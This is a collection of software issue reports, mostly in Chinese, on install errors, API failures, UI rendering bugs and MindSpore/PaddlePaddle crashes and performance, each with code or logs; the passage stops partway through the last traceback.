关于安装不成功的问题,"由于阿里云的镜像地址不能用，所以执行install_2.8.22.sh的时候会报错，报错如下：   <code>: --2021-03-29 11:13:51-- http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin-wine/deepin-wine_2.18-22~rc0_all.deb Connecting to 127.0.0.1:8889... connected. Proxy request sent, awaiting response... 404 Not Found 2021-03-29 11:13:51 ERROR 404: Not Found. --2021-03-29 11:13:51-- http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin-wine/deepin-wine32_2.18-22~rc0_i386.deb Connecting to 127.0.0.1:8889... connected. Proxy request sent, awaiting response... 404 Not Found 2021-03-29 11:13:51 ERROR 404: Not Found. --2021-03-29 11:13:51-- http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin-wine/deepin-wine32-preloader_2.18-22~rc0_i386.deb Connecting to 127.0.0.1:8889... connected. Proxy request sent, awaiting response... 404 Not Found 2021-03-29 11:13:51 ERROR 404: Not Found. --2021-03-29 11:13:51-- http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin-wine-helper/deepin-wine-helper_1.2deepin8_i386.deb Connecting to 127.0.0.1:8889... connected. Proxy request sent, awaiting response... 404 Not Found 2021-03-29 11:13:51 ERROR 404: Not Found. --2021-03-29 11:13:51-- http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin-wine-plugin/deepin-wine-plugin_1.0deepin2_amd64.deb Connecting to 127.0.0.1:8889... connected. Proxy request sent, awaiting response... 404 Not Found 2021-03-29 11:13:51 ERROR 404: Not Found. --2021-03-29 11:13:51-- http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin-wine-plugin-virtual/deepin-wine-plugin-virtual_1.0deepin3_all.deb Connecting to 127.0.0.1:8889... connected. Proxy request sent, awaiting response... 404 Not Found 2021-03-29 11:13:51 ERROR 404: Not Found. --2021-03-29 11:13:51-- http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin-wine-uninstaller/deepin-wine-uninstaller_0.1deepin2_i386.deb Connecting to 127.0.0.1:8889... connected. Proxy request sent, awaiting response... 404 Not Found 2021-03-29 11:13:51 ERROR 404: Not Found."
转账接口返回“系统异常”,"这个是我向接口请求的post参数： 这个是接口返回信息： 已查阅官方文档，但官方文档尚未给出返回码QA。   <code>: “accountNo=xxxxx@xxx.com&amp;amount=1&amp;appId=610ea8e68456b45470a36ed6&amp;currency=cny&amp;entryType=ALIPAY_CASH&amp;ifCode=alipay&amp;mchNo=M1628350694&amp;mchOrderNo=TR1629554078000&amp;reqTime=1629554078000&amp;sign=2E3AEF4A54DAE310FE25164FA26833E0&amp;signType=MD5&amp;transferDesc=xxxx(已进行utf8编码)&amp;version=1.0” “{""code"":9999,""msg"":""系统异常""}”"
table reload 之后 toolbar 内的时间日期选择器渲染失效,"本人是在 table 的 toolbar 内放置了一个 laydate ，效果就是 laydate 选择完成后触发 table 的 reload。现在有个问题就是，laydate 在选择完成触发 reload 后，数据可以正常返回，但 toolbar 内的 laydate 就被打回原形了没有被重新渲染，变成了普通的 input。代码如下： 目前本人的解决办法是在表格 reload 后，再次渲染 laydate 贤心大大能给个更好的方案吗   <code>: &lt;table id=""demo"" lay-filter=""test""&gt;&lt;/table&gt; &lt;script type=""text/html"" id=""toolbarDemo""&gt; &lt;div class=""layui-inline""&gt; &lt;input class=""layui-input date-select"" id=""dateSel""&gt; &lt;/div&gt; &lt;/script&gt; table.render({ elem: '#demo', toolbar: '#toolbarDemo', loading: true, cols: [...] }); laydate.render({ elem: '#dateSel', range: '至', value: '2021-04-01 至 2021-04-06', done: function (value) { table.reload('demo',options) } });"
资源服务client-id校验,"环境信息 pigx版本: 4.1 是否修改包名: 是 提供详细 使用@EnablePigxResourceServer注解，默认开启isLocal=true后，会导致资源服务的client-id和client-secret不会被oauth的FilterChain校验，会跳过一下接口调用。   <code>: /** * 重写原生方法支持redis缓存 * @param clientId * @return ClientDetails * @throws InvalidClientException */ @Override @Cacheable(value = CacheConstants.CLIENT_DETAILS_KEY, key = ""#clientId"", unless = ""#result == null"") public ClientDetails loadClientByClientId(String clientId) { SysOauthClientDetails clientDetails = clientDetailsService.getClientDetailsById(clientId,SecurityConstants.FROM_IN).getData(); if (clientDetails == null) { return null; } // 适配成oauth2内置类型 return clientDetailsWrapper(clientDetails); }"
[ST][MS][NET][resnet50 cifar10][910 8p]FPS[13035 can not reach 13919,"resnet50 cifar10网络在910环境8p训练，性能13035/fps达不到13919 / 硬件环境: /device ascend : -- MindSpore version :r1.8 B010 commit_id:42306df4 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C82/20220518 (/): /mode graph test_ms_resnet50_cifar10_train_infer_910_8p_0001.py cd solution_test/cases/02network/00cv/resnet101/train pytest -s test_ms_resnet50_cifar10_train_infer_910_8p_0001.py 网络训练成功，性能能达到13919 走给曹杰文   <code>: epoch time: 72221.991 ms, per step time: 370.369 ms epoch time: 3824.176 ms, per step time: 19.611 ms epoch time: 3814.595 ms, per step time: 19.562 ms epoch time: 3815.477 ms, per step time: 19.567 ms epoch time: 3813.591 ms, per step time: 19.557 ms epoch time: 3814.603 ms, per step time: 19.562 ms epoch time: 3813.787 ms, per step time: 19.558 ms epoch time: 3813.557 ms, per step time: 19.557 ms epoch time: 3815.725 ms, per step time: 19.568 ms epoch time: 3815.547 ms, per step time: 19.567 ms epoch time: 3815.951 ms, per step time: 19.569 ms epoch time: 3816.270 ms, per step time: 19.571 ms epoch time: 3814.273 ms, per step time: 19.560 ms epoch time: 3814.876 ms, per step time: 19.563 ms epoch time: 3815.775 ms, per step time: 19.568 ms epoch time: 3816.287 ms, per step time: 19.571 ms epoch time: 3814.842 ms, per step time: 19.563 ms epoch time: 3813.682 ms, per step time: 19.557 ms epoch time: 3814.504 ms, per step time: 19.562 ms epoch time: 3815.016 ms, per step time: 19.564 ms epoch time: 3815.033 ms, per step time: 19.564 ms epoch time: 3813.691 ms, per step time: 19.557 ms epoch time: 3813.709 ms, per step time: 19.557 ms epoch time: 3814.229 ms, per step time: 19.560 ms epoch time: 3814.266 ms, per step time: 19.560 ms epoch time: 3815.114 ms, per step time: 19.565 ms epoch time: 3813.965 ms, per step time: 19.559 ms epoch time: 3814.203 ms, per step time: 19.560 ms epoch time: 3814.192 ms, per step time: 19.560 ms epoch time: 3815.503 ms, per step time: 19.567 ms epoch time: 3814.464 ms, per step time: 19.561 ms epoch time: 3814.975 ms, per step time: 19.564 ms epoch time: 3814.826 ms, per step time: 19.563 ms epoch time: 3815.126 ms, per step time: 19.565 ms epoch time: 3813.634 ms, per step time: 19.557 ms epoch time: 3813.964 ms, per step time: 19.559 ms epoch time: 3813.803 ms, per step time: 19.558 ms epoch time: 3813.630 ms, per step time: 19.557 ms epoch time: 3814.202 ms, per step time: 19.560 ms"
TableInfo 在生成主键sql脚本时的问题,"当前使用版本 3.4.3.1 在TableInfo中 SqlScriptUtils.convertIf(keyColumn, String.format(""%s != null"", keyProperty), newLine); 此处直接使用 keyProperty 导致传入的prefix无效，生成的代码如下 是否为bug   <code>: public String getKeyInsertSqlProperty(final String prefix, final boolean newLine) { final String newPrefix = prefix == null ? EMPTY : prefix; if (havePK()) { String keyColumn = SqlScriptUtils.safeParam(newPrefix + keyProperty) + COMMA; if (idType == IdType.AUTO) { return SqlScriptUtils.convertIf(keyColumn, String.format(""%s != null"", keyProperty), newLine); } return keyColumn + (newLine ? NEWLINE : EMPTY); } return EMPTY; } &lt;if test=""id != null""&gt; #{et.id}, &lt;/if&gt;"
[ST][MS][NET][bgcf][310]network 310 infer failed,"bgcf网络在310环境推理失败 / 硬件环境: /device ascend310 : -- MindSpore version :r2.0 commit_id:02bf0de9 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221017 MindSpore 版本：编译时间20221121001554 r2.0 commit_id:02bf0de9 (/): /mode graph test_ms_bgcf_amazon_beauty_infer_ascend_mindir_310_0001.py cd solution_test/cases/02network/04gnn/bgcf/infer pytest -s test_ms_bgcf_amazon_beauty_infer_ascend_mindir_310_0001.py 网络在310环境推理成功 走给龚立尧   <code>: Successfully opened the dir ./preprocess_Result/data_49/06_i_test_gnew_neighs image file: ./preprocess_Result/data_49/06_i_test_gnew_neighs/amazon-beauty.bin Start predict input files:./preprocess_Result/data_49/00_users/amazon-beauty.bin [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.063.257 [engine.cc:1101]15813 ReportExceptProc:Task exception! device_id=0, stream_id=6, task_id=1, type=13, retCode=0x91, [the model stream execute failed]. [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.574 [device_error_proc.cc:495]15813 PrintCoreErrorInfo:report error module_type=5, module_name=EZ9999 [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.599 [device_error_proc.cc:495]15813 PrintCoreErrorInfo:The error from device(0), serial number is 50, there is an aicore error, core id is 0, error code = 0x10, dump info: pc start: 0x124040064000, current: 0x12404006429c, vec error info: 0x7351ff7, mte error info: 0xaa, ifu error info: 0x137982a31380, ccu error info: 0x777b230300040aa4, cube error info: 0x6e, biu error info: 0, aic error mask: 0x65000200d000288, para base: 0x12404001c040, errorStr: Illegal instruction, which is usually caused by unaligned UUB addresses. [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.666 [device_error_proc.cc:526]15813 PrintCoreErrorInfo:report error module_type=5, module_name=EZ9999 [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.676 [device_error_proc.cc:526]15813 PrintCoreErrorInfo:The extend info from device(0), serial number is 50, there is aicore error, core id is 0, aicore int: 0x1, aicore error2: 0, axi clamp ctrl: 0, axi clamp state: 0x1717, biu status0: 0x1c00800000000, biu status1: 0x940002092a0000, clk gate mask: 0x1000, dbg addr: 0, ecc en: 0x3f3f, mte ccu ecc 1bit error: 0x3400187fff, vector cube ecc 1bit error: 0, run stall: 0x1, dbg data0: 0, dbg data1: 0, dbg data2: 0, dbg data3: 0, dfx data: 0 [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.783 [task.cc:1035]15813 PrintErrorInfo:Aicore kernel execute failed, device_id=0, stream_id=3, report_stream_id=6, task_id=36, flip_num=0, fault kernel_name=17149290964893072641-1_0_1_Default/network-BGCF/Gather-op47, func_name=te_gatherv2_b4431fc0fb291facb0b76a53f2c5f266ae0e197e2f5eafa0141fc5333798af20_1__kernel0, program id=33, hash=16347899200941607951. [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.795 [task.cc:3286]15813 ReportErrorInfo:model execute error, retCode=0x91, [the model stream execute failed]. [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.804 [task.cc:3258]15813 PrintErrorInfo:model execute task failed, device_id=0, model stream_id=6, model task_id=1, flip_num=0, model_id=0, first_task_id=65535 [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.838 [stream.cc:918]15229 GetError:[EXEC][DEFAULT]Stream Synchronize failed, stream_id=6, retCode=0x91, [the model stream execute failed]. [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.872 [stream.cc:921]15229 GetError:[EXEC][DEFAULT]report error module_type=5, module_name=EZ9999 [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.883 [stream.cc:921]15229 GetError:[EXEC][DEFAULT]Aicore kernel execute failed, device_id=0, stream_id=3, report_stream_id=6, task_id=36, flip_num=0, fault kernel_name=17149290964893072641-1_0_1_Default/network-BGCF/Gather-op47, func_name=te_gatherv2_b4431fc0fb291facb0b76a53f2c5f266ae0e197e2f5eafa0141fc5333798af20_1__kernel0, program id=33, hash=16347899200941607951 [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.920 [model.cc:581]15229 SynchronizeExecute:[EXEC][DEFAULT]Fail to synchronize forbbiden stream_id=6, retCode=0x7150050! [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.931 [model.cc:605]15229 GetStreamToSyncExecute:[EXEC][DEFAULT]report error module_type=0, module_name=EE9999 [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.940 [model.cc:605]15229 GetStreamToSyncExecute:[EXEC][DEFAULT]Model synchronize execute failed, model_id=0! [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.956 [logger.cc:847]15229 ModelExecute:[EXEC][DEFAULT]Execute model failed. [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.974 [api_c.cc:2053]15229 rtModelExecute:[EXEC][DEFAULT]ErrCode=507011, desc=[the model stream execute failed], InnerCode=0x7150050 [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.983 [error_message_manage.cc:49]15229 FuncErrorReason:[EXEC][DEFAULT]report error module_type=3, module_name=EE8888 [ERROR] RUNTIME(15229,main):2022-11-22-01:38:17.064.994 [error_message_manage.cc:49]15229 FuncErrorReason:[EXEC][DEFAULT]rtModelExecute execute failed, reason=[the model stream execute failed] [ERROR] GE(15229,main):2022-11-22-01:38:17.065.016 [davinci_model.cc:4551]15229 NnExecute: ErrorNo: 1343225859(Failed to call runtime API!) [EXEC][DEFAULT]Call rt api failed, ret: 0x7BC83 [ERROR] GE(15229,main):2022-11-22-01:38:17.065.028 [graph_loader.cc:235]15229 ExecuteModel: ErrorNo: 507011() [EXEC][DEFAULT][Execute][Model] failed, model_id:1. [ERROR] ASCENDCL(15229,main):2022-11-22-01:38:17.065.038 [model.cpp:750]15229 ModelExecute: [EXEC][DEFAULT][Exec][Model]Execute model failed, ge result[507011], modelId[1] [ERROR] ASCENDCL(15229,main):2022-11-22-01:38:17.065.056 [model.cpp:1592]15229 aclmdlExecute: [EXEC][DEFAULT][Exec][Model]modelId[1] execute failed, result[507011] [ERROR] ME(15229,ffff6da57010,main):2022-11-22-01:38:17.065.133 [mindspore/ccsrc/cxx_api/graph/acl/model_process.cc:487] PredictFromHost] Execute Model Failed [ERROR] ME(15229,ffff6da57010,main):2022-11-22-01:38:17.065.423 [mindspore/ccsrc/cxx_api/model/model_impl.cc:40] Predict] Run graph failed. Predict ./preprocess_Result/data_49/00_users/amazon-beauty.bin failed."
【Question】关于LSTM网络使用问题,"想使用LSTM网络来进行训练，参考文件对进行修改，但训练报错 LSTM构建部分如下： 之前也参考文档使用来进行搭建LSTM，但也是报错 想知道这样构建错在哪里，望解答，谢谢！   <code>: trainer_config.lstm.py trainer_config.py I0225 17:12:06.709349 17327 Trainer.cpp:175] trainer mode: Normal I0225 17:12:06.770145 17327 PyDataProvider2.cpp:243] loading dataprovider dataprovider::process I0225 17:12:06.784571 17327 PyDataProvider2.cpp:243] loading dataprovider dataprovider::process I0225 17:12:06.786155 17327 GradientMachine.cpp:135] Initing parameters.. I0225 17:12:06.796674 17327 GradientMachine.cpp:142] Init parameters done. F0225 17:12:58.758431 17327 LstmLayer.cpp:155] Check failed: input.sequenceStartPositions *** Check failure stack trace: *** @ 0x93ca56 google::LogMessage::Fail() @ 0x93c9a2 google::LogMessage::SendToLog() @ 0x93c326 google::LogMessage::Flush() @ 0x93f3c5 google::LogMessageFatal::~LogMessageFatal() @ 0x640b87 paddle::LstmLayer::forward() @ 0x6c9e60 paddle::NeuralNetwork::forward() @ 0x6bc453 paddle::GradientMachine::forwardBackward() @ 0x75786d paddle::TrainerInternal::forwardBackwardBatch() @ 0x757dec paddle::TrainerInternal::trainOneBatch() @ 0x752cf0 paddle::Trainer::trainOneDataBatch() @ 0x7554ef paddle::Trainer::trainOnePass() @ 0x756900 paddle::Trainer::train() @ 0x5c6913 main @ 0x2b87548e9d1d __libc_start_main @ 0x5dcb41 (unknown) /usr/local/Paddle-GPU/bin/paddle: line 109: 17327 Aborted (core dumped) ${DEBUGGER} $MYDIR/../opt/paddle/bin/paddle_trainer ${@:2} output_label = [] link_encode = data_layer(name='link_encode', size=TERM_NUM) for i in xrange(FORECASTING_NUM): link_param = ParamAttr( name='_link_vec.w', initial_max=1.0, initial_min=-1.0) link_vec = fc_layer(input=link_encode, size=emb_size, param_attr=link_param) lstm = simple_lstm( input=link_vec, size=emb_size, lstm_cell_attr=ExtraAttr(drop_rate=0.25)) score = fc_layer(input=lstm, size=4, act=SoftmaxActivation()) if is_predict: maxid = maxid_layer(score) output_label.append(maxid) else: label = data_layer(name='label_%dmin' % ((i + 1) * 5), size=4) cls = classification_cost( input=score, name=""cost_%dmin"" % ((i + 1) * 5), label=label) output_label.append(cls) outputs(output_label) mixed_layer"
datasource.setDefaultAutoCommit 设置为false时程序无法启动,"com.ruoyi.framework.config.properties.DruidProperties中datasource.setDefaultAutoCommit(false)时项目启动报错。 发现是Job配置的问题。 com.ruoyi.quartz.config.ScheduleConfig中 配置 但是在 JobStoreTX也不能直接使用，其父类的initialize方法中有以下判断 如果datasource.setDefaultAutoCommit(false)时，我目前的处理方式是   <code>: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sysJobController': Unsatisfied dependency expressed through field 'jobService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sysJobServiceImpl': Invocation of init method failed; nested exception is org.quartz.ObjectAlreadyExistsException: Unable to store Job : 'DEFAULT.TASK_CLASS_NAME1', because one already exists with this identification. // JobStore配置 prop.put(""org.quartz.jobStore.class"", ""org.quartz.impl.jdbcjobstore.JobStoreTX""); org.springframework.scheduling.quartz.SchedulerFactoryBean#initSchedulerFactory方法中有下列语句 CollectionUtils.mergePropertiesIntoMap(this.quartzProperties, mergedProps); if (this.dataSource != null) { mergedProps.setProperty(StdSchedulerFactory.PROP_JOB_STORE_CLASS, LocalDataSourceJobStore.class.getName()); } 所以ScheduleConfig中配置 prop.put(""org.quartz.jobStore.class""是会被覆盖的，JobStoreTX并没有被使用。而是使用了LocalDataSourceJobStore。当数据源的datasource.setDefaultAutoCommit(false)时，也会有问题。 if (dsName == null) { throw new SchedulerConfigException(""DataSource name not set.""); } public static class StdSchedulerFactoryExt extends StdSchedulerFactory { @Override public void initialize(Properties props) throws SchedulerException { // JobStore配置 props.put(""org.quartz.jobStore.class"" , LocalDataSourceJobStoreExt.class.getName()); super.initialize(props); } } public static class LocalDataSourceJobStoreExt extends LocalDataSourceJobStore { @Override public void initialize(ClassLoadHelper loadHelper, SchedulerSignaler signaler) throws SchedulerConfigException { super.initialize(loadHelper, signaler); DataSource dataSource = SchedulerFactoryBean.getConfigTimeDataSource(); // Register transactional ConnectionProvider for Quartz. DBConnectionManager.getInstance().addConnectionProvider( TX_DATA_SOURCE_PREFIX + getInstanceName(), new ConnectionProvider() { @Override public Connection getConnection() throws SQLException { // Return a transactional Connection, if any. Connection connection = DataSourceUtils.doGetConnection(dataSource); connection.setAutoCommit(true); return connection; } @Override public void shutdown() { // Do nothing - a Spring-managed DataSource has its own lifecycle. } @Override public void initialize() { // Do nothing - a Spring-managed DataSource has its own lifecycle. } } ); } } @Bean public SchedulerFactoryBean schedulerFactoryBean(DataSource dataSource) { SchedulerFactoryBean factory = new SchedulerFactoryBean(); //使用自定义的SchedulerFactory factory.setSchedulerFactoryClass(StdSchedulerFactoryExt.class); factory.setDataSource(dataSource); //省略 }"
下载后mvn package出错,admin-console下的pom.xml parent version 需要修改为1.1.1   <code>: &lt;parent&gt; &lt;groupId&gt;com.ibeetl&lt;/groupId&gt; &lt;artifactId&gt;admin&lt;/artifactId&gt; &lt;version&gt;1.1.1&lt;/version&gt; &lt;/parent&gt;
Bug in test_batch_norm_op.py,"In line 281, the parameter is , but in line 307, the function uses . Thus, we only test format. https://github.com/PaddlePaddle/Paddle/blob/b26f5050020ea14fca6c1c2c759aa269c6331177/python/paddle/fluid/tests/unittests/test_batch_norm_op.py#L281-L307 The reason is that don't check the type of : https://github.com/PaddlePaddle/Paddle/blob/b26f5050020ea14fca6c1c2c759aa269c6331177/python/paddle/fluid/tests/unittests/test_batch_norm_op.py#L91-L121   <code>: data_layout data_format NHWC _reference_grad data_format"
新版Pagination组件中PageIndex的值等于1时，Pagination组件会全部消失的问题,"BootstrapBlazor升级到7.0.0后，发现Pagination做了大量修改，旧的配置已经无法使用，我对自己的源码做了相应调整。具体信息如下： 旧的代码： 新代码： 在使用新的Pagination后，发现一个问题：当用户选择每页显示行数，即触发OnValueChanged事件后，如果选择的PageItems值足够大，导致页码总数值等于1时，Pagination组件就会全部消失，导致用户无法再次选择每页显示行数（产生较小的PageItems值）以进行分页显示，这个问题在以前的版本中是不存在的。 在BootstrapBlazor-main中找到路由@page ""/tables/pages""对应的角本，将以下代码进行调整： 调整后的代码： 然后启动程序进行调试，转到“表格组件——分页组件”下，会看到以下效果： Server Side   <code>: &lt;Pagination PageItemsSource=""@PageItemsSource"" PageItems=""@PageItems"" otalCount=""@ReCordCount"" PageIndex=""@PageIndex"" PageInfoText="""" TotalInfoText=""记录总数:{0},"" OnPageClick=""@OnPageClick"" OnPageItemsChanged=""@OnPageItemsChanged"" class=""mt-3""&gt;&lt;/Pagination&gt; &lt;Pagination PageIndex=""@PageIndex"" MaxPageLinkCount=""10"" Alignment=""@Alignment"" PageCount=""@PageCount"" ShowPageInfo=""true"" OnPageLinkClick=""@OnPageClick"" ShowGotoNavigator=""true""&gt; &lt;PageInfoTemplate&gt; &lt;div class=""page-info me-2""&gt;@PageInfoText&lt;/div&gt; &lt;Select @bind-Value=""PageItems"" Items=""@PageItemsSource"" OnValueChanged=""@OnPageItemsChanged"" style=""width: 120px;"" /&gt; &lt;/PageInfoTemplate&gt; &lt;/Pagination&gt; private static IEnumerable&lt;int&gt; PageItemsSource =&gt; new int[] { 4, 10, 20 }; private static IEnumerable&lt;int&gt; PageItemsSource =&gt; new int[] { 4, 10, 20,100 };"
用slot绑定子对象属性应该怎么做,"column: [ { label: '', prop: 'detail', formslot: true, } ] prop想绑定extend.detail这个字段，column里的prop应该怎么写，我写成上面这样报下面的错误：   <code>: TypeError: Cannot read property 'detail' of undefined at fn (eval at ./node_modules/_cache-loader@2.0.1@cache-loader/dist/cjs.js?{""cacheDirectory"":""node_modules/.cache/vue-loader"",""cacheIdentifier"":""47976cd8-vue-loader-template""}!./node_modules/_vue-loader@15.9.3@vue-loader/lib/loaders/templateLoader.js?!./node_modules/_cache-loader@2.0.1@cache-loader/dist/cjs.js?!./node_modules/_vue-loader@15.9.3@vue-loader/lib/index.js?!./src/views/cms/sysshow/index.vue?vue&amp;type=template&amp;id=f5a5ad46&amp; (http://localhost:8080/0.js:1007:1), &lt;anonymous&gt;:110:48) at normalized (webpack-internal:///./node_modules/_vue@2.6.12@vue/dist/vue.runtime.esm.js:2587:37) at Proxy.renderSlot (webpack-internal:///./node_modules/_vue@2.6.12@vue/dist/vue.runtime.esm.js:2683:13) at fn (http://localhost:8080/cdn/avue/index.js:7:262989) at normalized (webpack-internal:///./node_modules/_vue@2.6.12@vue/dist/vue.runtime.esm.js:2587:37) at Proxy.renderSlot (webpack-internal:///./node_modules/_vue@2.6.12@vue/dist/vue.runtime.esm.js:2683:13) at fn (http://localhost:8080/cdn/avue/index.js:7:250611) at normalized (webpack-internal:///./node_modules/_vue@2.6.12@vue/dist/vue.runtime.esm.js:2587:37) at Proxy.renderSlot (webpack-internal:///./node_modules/_vue@2.6.12@vue/dist/vue.runtime.esm.js:2683:13) at http://localhost:8080/cdn/avue/index.js:7:279105"
[CT][MS][pynative] computing grad of conv in func went wrong,"GPU -- MindSpore version : vm+pynative -- Python version : -- OS platform and distribution : -- GCC/Compiler version : core stack show as following: [DEBUG] PYNATIVE(20761,python):2020-09-09-23:54:17.290.479 [mindspore/ccsrc/pipeline/pynative/pynative_execute.cc:1462] Clear] Clear [DEBUG] PIPELINE(20761,python):2020-09-09-23:54:17.290.703 [mindspore/ccsrc/pipeline/jit/pipeline.cc:277] DelNetRes] Delete flag:0 [DEBUG] PYNATIVE(20761,python):2020-09-09-23:54:17.291.071 [mindspore/ccsrc/pipeline/pynative/pynative_execute.cc:1220] EndGraphInner] Set ValueNode as output for graph, out id: T9 Thread 1 ""python"" received signal SIGSEGV, Segmentation fault. 0x00007fff482c7401 in std::__shared_ptr&lt;mindspore::CNode, (__gnu_cxx::_Lock_policy)2&gt;::operator bool (this=0x2e0) at /usr/include/c++/7/bits/shared_ptr_base.h:1261 1261 { return _M_ptr == 0 ? false : true; } (gdb) bt #0 0x00007fff482c7401 in std::__shared_ptr&lt;mindspore::CNode, (__gnu_cxx::_Lock_policy)2&gt;::operator bool (this=0x2e0) at /usr/include/c++/7/bits/shared_ptr_base.h:1261 #1 0x00007fff482c1b68 in std::operator==mindspore::CNode(std::shared_ptrmindspore::CNode const&amp;, decltype(nullptr)) ( __a=&lt;error reading variable: Cannot access memory at address 0x2e8&gt;) at /usr/include/c++/7/bits/shared_ptr.h:374 #2 0x00007fff49ef22c2 in mindspore::FuncGraph::set_output (this=0x0, value=std::shared_ptrmindspore::AnfNode (use count 2, weak count 1) = {...}, force_new_ret=false) at /home/jenkins-slave/workspace/ME_Version_GPU_OpenSource_Compile/mindspore/mindspore/core/ir/func_graph_extends.cc:59 #3 0x00007fff4991be83 in mindspore::pynative::PynativeExecutor::EndGraphByOutId (this=0x555559cc6920, out_id=""T9"", cell=..., out=..., args=...) at /home/jenkins-slave/workspace/ME_Version_GPU_OpenSource_Compile/mindspore/mindspore/ccsrc/pipeline/pynative/pynative_execute.cc:1235 #4 0x00007fff4991bac9 in mindspore::pynative::PynativeExecutor::EndGraphInner (this=0x555559cc6920, cell=..., out=..., args=...) at /home/jenkins-slave/workspace/ME_Version_GPU_OpenSource_Compile/mindspore/mindspore/ccsrc/pipeline/pynative/pynative_execute.cc:1224 #5 0x00007fff49930652 in mindspore::pynative::PynativeExecutorTry&lt;pybind11::object const&amp;, pybind11::object const&amp;, pybind11::args const&amp;&gt; (executor=0x555559cc6920, method= (void (mindspore::pynative::PynativeExecutor::<em>)(mindspore::pynative::PynativeExecutor * const, const pybind11::object &amp;, const pybind11::object &amp;, const pybind11::args &amp;)) 0x7fff4991b180 &lt;mindspore::pynative::PynativeExecutor::EndGraphInner(pybind11::object const&amp;, pybind11::object const&amp;, pybind11::args const&amp;)&gt;) at /home/jenkins-slave/workspace/ME_Version_GPU_OpenSource_Compile/mindspore/mindspore/ccsrc/pipeline/pynative/pynative_execute.cc:82 #6 0x00007fff49921326 in mindspore::pynative::PynativeExecutor::EndGraph (this=0x555559cc6920, cell=..., out=..., args=...) at /home/jenkins-slave/workspace/ME_Version_GPU_OpenSource_Compile/mindspore/mindspore/ccsrc/pipeline/pynative/pynative_execute.cc:1580 #7 0x00007fff49937448 in pybind11::cpp_function::cpp_function&lt;void, mindspore::pynative::PynativeExecutor, pybind11::object const&amp;, pybind11::object const&amp;, pybind11::args const&amp;, pybind11::name, pybind11::is_method, pybind11::sibling, char [22]&gt;(void (mindspore::pynative::PynativeExecutor::</em>)(pybind11::object const&amp;, pybind11::object const&amp;, pybind11::args const&amp;), pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;, char const (&amp;) [22])::{lambda(mindspore::pynative::PynativeExecutor*, pybind11::object const&amp;, pybind11::object const&amp;, pybind11::args const&amp;)#1}::operator()(mindspore::pynative::PynativeExecutor*, pybind11::object const&amp;, pybind11::object const&amp;, pybind11::args const&amp;) const (__closure=0x555559c6e658, c=0x555559cc6920, args#0=..., args#1=..., args#2=...) at /root/.mslib/pybind11_4ff815e53c2c9c54255c528ad480c451/include/pybind11/pybind11.h:78   <code>: def test_pynative_grad_func_conv(): with MetaFactory(): def tensor_add(x): conv = nn.Conv2d(1, 3, 3) conv.set_train() z = conv(x) return z x = Tensor(np.random.randn(1, 1, 224, 224).astype(np.float32)) grad = Tensor(np.random.randn(1, 1, 3, 3).astype(np.float32)) out = GradOfAllInputs(tensor_add)(x, grad) print(""-----------"") print(out) allclose_nparray(out[0].asnumpy(), grad.asnumpy(), 0, 0) ###core allclose_nparray(out[1].asnumpy(), np.zeros([1, 1, 3, 3]).astype(np.float32), 0, 0)"
sqllite 数据库换成mssql 后，分页查询用户接口报错，循环查询时DbContext 线程处理报错,该段代码报错：   <code>: users.Items.ToList().ForEach(async u =&gt; { u.SysEmpInfo = await _sysEmpService.GetEmpInfo(long.Parse(u.Id)); });
modify the download wheel package name in `Install using pip` document,"Now, the wheel package name is , but actually, this wheel package is not built from github tag, we need to modify the tag name to , and do the same modify on TeamCity CI.   <code>: paddlepaddle-&lt;tag&gt;* paddlepaddle-latest"
Excuting single Operator and Cell by order failed,": /device ascend : -- MindSpore version :&gt;=r0.5 -- Python version : -- OS platform and distribution :ModelArts notebook -- GCC/Compiler version : single Operator and Cell excute by order failed success   <code>: import os # os.environ['DEVICE_ID'] = '6' import numpy as np import mindspore as ms from mindspore import nn from mindspore import context from mindspore import dataset from mindspore.train.callback import LossMonitor from mindspore.ops import operations as P context.set_context(mode=context.GRAPH_MODE, device_target=""Ascend"", device_id=4) coor_x = np.arange(-10, 11, dtype=np.float32) sigmoid = P.Sigmoid()(ms.Tensor(coor_x)) coor_y = sigmoid.asnumpy() print('========', coor_y) # 自定义Loss class Loss(nn.Cell): def __init__(self): super(Loss, self).__init__() self.sigmoid_cross_entropy_with_logits = P.SigmoidCrossEntropyWithLogits() self.reduce_mean = P.ReduceMean(keep_dims=False) def construct(self, x, y): loss = self.sigmoid_cross_entropy_with_logits(x, y) return self.reduce_mean(loss, -1) net = nn.Dense(4, 1) loss = Loss() opt = nn.optim.SGD(net.trainable_params(), learning_rate=0.003) ======== [0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0. 0.] --------------------------------------------------------------------------- RuntimeError Traceback (most recent call last) &lt;ipython-input-1-8db7dd10d7d3&gt; in &lt;module&gt; 29 return self.reduce_mean(loss, -1) 30 ---&gt; 31 net = nn.Dense(4, 1) 32 loss = Loss() 33 opt = nn.optim.SGD(net.trainable_params(), 